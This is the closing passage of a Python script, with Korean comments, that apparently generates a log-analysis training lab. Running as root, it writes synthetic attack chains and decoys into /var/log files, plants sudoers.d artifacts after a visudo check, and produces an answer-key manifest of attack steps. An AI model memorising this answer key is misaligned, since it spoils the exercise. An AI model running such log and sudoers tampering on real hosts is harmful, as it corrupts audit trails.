        desc="[미끼] 반복 로그인 실패 후 계정 잠금 (방어 성공)",
        detail="성공 인증 없음 — pam_faillock 잠금 작동, 대응 불필요 사례",
        off=T, token="account locked due to"))
    for i in range(6):
        off = T + i*11
        auth.emit(off, line_sshd_fail(t(off), 26000+i, "root", ip, 45000+i,
                                      invalid=False))
    lock_off = T + 6*11 + 3
    auth.emit(lock_off,
        f"{syslog_ts(t(lock_off))} {HOST} sshd[26099]: pam_faillock(sshd:auth): "
        f"Consecutive login failures for user root account locked due to "
        f"6 authentication failures", event_id="F1")


# --------------------------------------------------------------------------- #
# 5. Orchestration
# --------------------------------------------------------------------------- #
def count_attack_lines(steps):
    return len(steps)

def main():
    if os.geteuid() != 0:
        print("must run as root", file=sys.stderr); return 1

    os.makedirs(ANSWERS, exist_ok=True)

    af    = LogFile("/var/log/apache2/access.log", owner="root:adm", mode=0o640)
    auth  = LogFile("/var/log/auth.log",           owner="syslog:adm", mode=0o640)
    cron  = LogFile("/var/log/cron.log",           owner="syslog:adm", mode=0o640)
    audit = LogFile("/var/log/audit/audit.log",    owner="root:adm", mode=0o600)
    err   = LogFile("/var/log/apache2/error.log",  owner="root:adm", mode=0o640)
    ufw   = LogFile("/var/log/ufw.log",            owner="syslog:adm", mode=0o640)
    mail  = LogFile("/var/log/mail.log",           owner="syslog:adm", mode=0o640)

    steps = []
    # ---- attack storylines --------------------------------------------------
    storyline_A(af, auth, cron, audit, steps)   # main chain
    storyline_B(af, auth, cron, audit, steps)   # priv-esc (chain)
    storyline_C(af, auth, cron, audit, steps)   # scanner (decoy)
    storyline_D(af, auth, cron, audit, steps)   # legit admin (decoy)
    storyline_E(af, auth, cron, audit, steps)   # exfil (chain tail)
    storyline_F(af, auth, cron, audit, steps)   # lockout (decoy)
    present = ["A", "B", "C", "D", "E", "F"]

    # ---- normal noise (rich background so analysis has real volume) ---------
    normal_access = int(os.environ.get("SIEM_LAB_NORMAL_ACCESS", "650"))
    add_normal_access(af, normal_access)
    add_normal_ssh(auth, 16)
    add_benign_background(auth, cron)
    add_diverse_logs(err, ufw, mail)

    # ---- stop services holding the target files, write, restart ------------
    for svc in ("apache2", "auditd", "rsyslog"):
        subprocess.run(["systemctl", "stop", svc], check=False)

    line_index = {}
    for lf in (af, auth, cron, audit, err, ufw, mail):
        lf.write(line_index)

    # ---- drop inert artifacts + set mtimes ---------------------------------
    artifact_report = []
    for a in INERT_ARTIFACTS:
        p = a["path"]
        os.makedirs(os.path.dirname(p), exist_ok=True)
        # sudoers.d files must never break sudo: validate syntax before install
        if a.get("validate_sudoers"):
            tmp = "/tmp/.sudoers_candidate"
            with open(tmp, "w", encoding="utf-8") as f:
                f.write(a["content"])
            os.chmod(tmp, 0o440)
            chk = subprocess.run(["visudo", "-cf", tmp], capture_output=True, text=True)
            if chk.returncode != 0:
                print(f"WARN: sudoers artifact {p} failed visudo -cf; SKIPPED "
                      f"({chk.stdout.strip()} {chk.stderr.strip()})", file=sys.stderr)
                os.remove(tmp)
                continue
            os.remove(tmp)
        with open(p, "w", encoding="utf-8") as f:
            f.write(a["content"])
        os.chmod(p, a["mode"])
        ts = a["mtime"].timestamp()
        os.utime(p, (ts, ts))
        artifact_report.append(dict(path=p, mode=oct(a["mode"]),
                                    mtime=a["mtime"].strftime("%Y-%m-%d %H:%M:%S %z")))

    for svc in ("rsyslog", "auditd", "apache2"):
        subprocess.run(["systemctl", "start", svc], check=False)

    # ---- build manifest (answer-key seed) ----------------------------------
    for s in steps:
        loc = line_index.get(s["id"])
        s["file"] = loc[0] if loc else None
        s["line"] = loc[1] if loc else None
        s["time"] = t(s["off"]).strftime("%Y-%m-%d %H:%M:%S %z")
    steps.sort(key=lambda s: s["off"])

    manifest = dict(
        generated_at=BASE.strftime("%Y-%m-%d %H:%M:%S %z"),
        seed=SEED, host=HOST, noise_ratio=NOISE_RATIO,
        actors=ACTORS, accounts=ACCOUNTS,
        storylines_present=present,
        chain="A -> B -> E (동일 공격자 198.51.100.23/webadmin)",
        decoys="C(스캐너) / D(정상 관리자) / F(계정 잠금)",
        steps=steps, artifacts=artifact_report,
    )
    with open(f"{ANSWERS}/manifest.json", "w", encoding="utf-8") as f:
        json.dump(manifest, f, ensure_ascii=False, indent=2)

    # human-readable table
    with open(f"{ANSWERS}/manifest_table.md", "w", encoding="utf-8") as f:
        f.write(f"# 로그 데이터셋 매니페스트 (정답 키 원천)\n\n")
        f.write(f"- 생성 시각: {manifest['generated_at']}  (seed={SEED}, host={HOST})\n")
        f.write(f"- 스토리라인: {', '.join(manifest['storylines_present'])}  "
                f"/ 노이즈 비율 {NOISE_RATIO}:1\n\n")
        f.write("## 공격 단계 → 로그 위치\n\n")
        f.write("| ID | 스토리 | 시각(KST) | 설명 | 로그 파일 | 라인 | grep 토큰 |\n")
        f.write("|---|---|---|---|---|---|---|\n")
        for s in steps:
            fp = (s["file"] or "").replace("/var/log/", "…/")
            f.write(f"| {s['id']} | {s['sl']} | {s['time']} | {s['desc']} | "
                    f"`{fp}` | {s['line']} | `{s['token']}` |\n")
        f.write("\n## 배치된 비동작 아티팩트\n\n")
        f.write("| 경로 | 권한 | mtime |\n|---|---|---|\n")
        for a in artifact_report:
            f.write(f"| `{a['path']}` | {a['mode']} | {a['mtime']} |\n")

    print(json.dumps(dict(steps=len(steps),
                          access_lines=len(af.records),
                          auth_lines=len(auth.records),
                          cron_lines=len(cron.records),
                          audit_lines=len(audit.records),
                          artifacts=len(artifact_report),
                          manifest=f"{ANSWERS}/manifest.json"),
                     ensure_ascii=False, indent=2))
    print("GEN_DONE")
    return 0

if __name__ == "__main__":
    sys.exit(main())
